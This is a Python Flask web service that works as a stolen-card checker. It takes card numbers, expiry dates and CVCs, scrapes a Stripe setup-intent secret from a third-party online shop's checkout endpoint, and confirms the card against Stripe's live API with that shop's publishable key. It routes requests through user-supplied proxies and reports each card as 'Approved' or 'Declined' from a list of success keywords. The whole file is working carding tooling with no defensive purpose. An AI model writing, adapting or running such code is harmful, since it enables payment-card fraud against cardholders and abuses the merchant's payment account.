from flask import Flask, request
import requests
import json
import urllib3

# Disable SSL warnings (not errors, just the yellow warnings)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

CVV_LIVE_KEYWORDS = [
    "succeeded", "payment_method.attached", "payment_method.created",
    "setup_intent.succeeded", "payment_method_saved", "card_verified",
    "card_tokenized", "verified_card", "cvv_passed", "cvc_check: pass",
    "card_live", "live cvv", "Your payment method was saved",
    "Card successfully added", "Card has been verified",
    "Payment method added successfully", "SetupIntent status: succeeded",
    "Payment method saved"
]

def build_proxy(proxy_str):
    try:
        ip, port, user, pw = proxy_str.split(":")
        return {
            "http": f"http://{user}:{pw}@{ip}:{port}",
            "https": f"http://{user}:{pw}@{ip}:{port}"
        }
    except Exception:
        return None

@app.route("/check", methods=["GET"])
def check_card():
    cc = request.args.get("cc")
    proxy_param = request.args.get("proxy")

    if not cc:
        return "Declined", 400

    try:
        cc, mm, yy, cvc = cc.split("|")
        if len(yy) == 4:  # Convert 2028 -> 28
            yy = yy[2:]
    except Exception:
        return "Declined", 400

    proxies = build_proxy(proxy_param) if proxy_param else None

    try:
        setup = requests.post(
            "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
            data={"payment_method": "stripe_cc"},
            headers={"User-Agent": "Mozilla/5.0"},
            proxies=proxies,
            timeout=8,
            verify=True  # safer in serverless
        )

        # Extract secrets
        seti = setup.text.split('{"client_secret":"')[1].split('"}')[0]
        secret = seti.split("_secret_")[0]

        confirm = requests.post(
            f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
            data={
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": cc,
                "payment_method_data[card][cvc]": cvc,
                "payment_method_data[card][exp_month]": mm,
                "payment_method_data[card][exp_year]": yy,
                "payment_method_data[billing_details][address][postal_code]": "10080",
                "use_stripe_sdk": "true",
                "key": "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
                "client_secret": seti
            },
            headers={"User-Agent": "Mozilla/5.0"},
            proxies=proxies,
            timeout=8,
            verify=True
        )

        response_data = confirm.json()
        raw = json.dumps(response_data).lower()

        if "succeeded" in raw or any(k in raw for k in CVV_LIVE_KEYWORDS):
            return "Approved"
        else:
            return "Declined"

    except Exception as e:
        # Log error to help debug on Vercel
        print("Error:", str(e))
        return "Declined", 500


# Vercel uses wsgi.py, so this block won’t run there
if __name__ == "__main__":
    app.run(debug=True)
